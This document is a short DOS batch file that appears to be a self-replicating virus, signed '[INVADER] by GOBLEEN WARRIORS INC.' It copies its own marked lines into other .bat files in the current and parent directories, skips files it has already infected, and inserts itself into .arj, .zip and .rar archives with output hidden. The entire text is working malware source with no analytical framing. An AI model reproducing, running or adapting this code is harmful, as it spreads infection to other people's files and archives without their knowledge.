@echo off %位%
break off %位%
if _%1==__ goto 位a
find "位"<%0>>位.bat
for %%a in (*.bat ..\*.bat ..\..\*.bat) do call 位.bat _ %%a
for %%a in (*.arj ..\*.arj ..\..\*.arj) do arj a %%a %0>nul %位%
for %%a in (*.zip ..\*.zip ..\..\*.zip) do pkzip %%a %0>nul %位%
for %%a in (*.rar ..\*.rar ..\..\*.rar) do rar a -tk -y -c- -o+ %%a %0>nul %位%
del 位.bat
goto 位e
:位a
find "位"<%2>nul
if not errorlevel 1 goto 位e
copy /b %2 位>nul
copy /b 位.bat+位 %2>nul
del 位
:位e
break on %位%
:位|        [INVADER] by GOBLEEN WARRIORS INC.
:位|   Thanx 2 Duke/SMF 4 some parts of this code.
